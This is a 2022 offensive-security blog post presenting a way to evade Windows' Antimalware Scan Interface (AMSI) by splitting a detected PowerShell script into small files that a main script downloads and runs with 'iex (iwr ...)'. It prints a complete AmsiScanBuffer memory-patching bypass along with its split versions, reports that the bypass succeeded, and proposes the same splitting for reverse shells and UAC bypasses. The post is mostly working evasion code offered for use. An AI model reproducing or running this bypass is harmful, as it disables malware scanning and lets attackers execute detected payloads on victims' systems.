---
title: "Divide And Bypass: A new Simple Way to Bypass AMSI"
author: x4sh3s
date: 2022-09-07 13:32:00 -0500
categories: [Defences Evasion]
tags: [amsi, powershell, bypass, windows ]
image:
  path: /commons/divide.jpg
  width: 800
  height: 500
  alt: 
---

This post is about a new simple way to bypass AMSI (Antimalware Scan Interface), that can be applied on small scripts, specially the popular AMSI bypasses.

## Introduction

In the last few years, Powershell become so popular and a great target for hackers, as it provide access to almost all windows's components, due to its integration with .NET framework, which allows us, Offensive security guys to perform differents attacks without even touching the disk, and that make AV jobs more difficut! 
Because of that, Microsoft introduced AMSI in 2015 as a defence Layer against this type of attacks, you can read all about it [here](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal).

A defense mechanism for the offensive side, means that it need a bypass, and that's what happened, new bypasses are discovered, Matt Graeber's Reflection method, Patching amsi.dll AmsiScanBuffer by rasta-mouse etc ...


## Problem?

With all those differents AMSI bypasses, using .NET related offensive tools become possible again. Until those AMSI bypasses got signatures and become detected, and that open a new static analysis bypass/obfuscation adventures, Which sometimes become so boring and time consuming with a high possibility to not get a good result.

Personally, i use powershell a lot, and i got tired of obfuscating small scripts, so it was very important for me to find a new way to bypass AMSI in powershell ..

## Thought Process

I'm sure if you have ever played with AMSI bypass before, you have noticed that copying pasting a script into a powershell session will bypass AMSI, even if the script itself is detected.
And that's because by copying and pasting a script, it's executed as separated lines, and it's very unusual to create a signature for an individual line, because that will cause alot of false positives. So how to get advantage of this ..? how can this be used in a real scenario? Maybe dividing the script into small files? let's try this ..

### Simple Test

i started with a small simple scripts :

```powershell
# simple_test.ps1
echo 'x4sh3s'
$var = Get-Process
cat $var
```

Let's divided it into 3 files, and execute the main one, to see if there are any problems with scoping or something else..

```powershell
# 1.txt
$var = Get-Process
```

```powershell
# 2.txt
cat $var
```

```powershell
# main.ps1
echo 'x4sh3s';
iex ( iwr http://$MyIP/1.txt -UseBasicParsing );
iex ( iwr http://$MyIP/2.txt -UseBasicParsing );
```

> the 2 files here ```1.txt and 2.txt``` can be hosted online, or in your local machine by simply starting a simple python web server `python3 -m http.server 80`.
{: .prompt-info }

By executing `./main.ps1` We see the processes list, which means that the variable `$var` in `1.txt` is accessible by `2.txt`. Good, let's try something else, maybe `Add-Type`.

> `Add-Type` cmdlet adds a Microsoft .NET class to a PowerShell session. It's used by Some AMSI Bypass which we'll see later ..
{: .prompt-info }


I took this example from [*Microsoft*](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2):

```powershell
# script.ps1

echo "This Line Is Mine"

$Source = @"
public class BasicTest
{
  public static int Add(int a, int b)
    {
        return (a + b);
    }
  public int Multiply(int a, int b)
    {
    return (a * b);
    }
}
"@

Add-Type -TypeDefinition $Source
[BasicTest]::Add(4, 3)
$BasicTestObject = New-Object BasicTest
$BasicTestObject.Multiply(5, 2)
```

Let's apply the same previous steps on it.. we will divide it into 3 files ..

```powershell
# 1.txt
$Source = @"
public class BasicTest
{
  public static int Add(int a, int b)
    {
        return (a + b);
    }
  public int Multiply(int a, int b)
    {
    return (a * b);
    }
}
"@
```

```powershell
# 2.txt
Add-Type -TypeDefinition $Source
[BasicTest]::Add(4, 3)
$BasicTestObject = New-Object BasicTest
$BasicTestObject.Multiply(5, 2)
```

```powershell
# main.ps1
echo "This Line Is Mine"
iex ( iwr http://$MyIP/1.txt -UseBasicParsing );
iex ( iwr http://$MyIP/2.txt -UseBasicParsing );
```

And it worked again, without problems:
```powershell
PS C:\Users\x4sh3s\OneDrive\Desktop> .\main.ps1
This Line Is Mine
7
10
```

## Bypass AMSI

Now, after we confirmed that this method work on the previous scripts, let's apply it on scripts that are detected, and see if we can execute them without making AMSI angry!

I'll take The following script by Rastamouse as an example:

```powershell
# amsi_bypass.ps1
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

If we try execute it, we'll get this output :
![Amsi Bypass](/commons/Rastamouse_amsi.png)

The Bypass itself is detected!

Let's divide it into 3 files

```powershell
# 1.txt
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
```

```powershell
# 2.txt
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

```powershell
# main.ps1
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

iex ( iwr http://localhost/1.txt -UseBasicParsing );
iex ( iwr http://localhost/2.txt -UseBasicParsing );
```

![Amsi Bypass_Divide](/commons/divide_amsi_bypass.png)

It Successfully Bypass AMSI, without changing a letter in the code! Niice..

![It's All Good, Man](/commons/Saul_Godman.jif)

> In case it's detected, breaking the script into more files (Line/file) will do the job, unless Microsoft finds a way to deny this method. Until then, Enjoy ^^
{: .prompt-warning }


## Conclusion

We reached the end of the post,

As a review, we saw how to bypass AMSI by dividing a script into small files. I think the most useful use-case of this method is execute an AMSI bypass, but it can be applied on any scripts ( small scripts ), Reverse shell, FODHelper UAC Bypass .. I didn't testing on a script that contains defined functions, but the principle stay the same.

i hope you learned something new by reading this post, if you have any comment/idea let me know, Any feedback will be appreciated .. 

## Links & Resources

- ***Hacker Cat Image***        [https://images.wallpaperscraft.com/image/single/cat_silhouette_hacker_215616_1440x900.jpg](https://images.wallpaperscraft.com/image/single/cat_silhouette_hacker_215616_1440x900.jpg)

- ***Add-Type***                [https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2)

- ***RastaMouse Amsi Bypass***  [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)

- ***AMSI***                    [https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal)
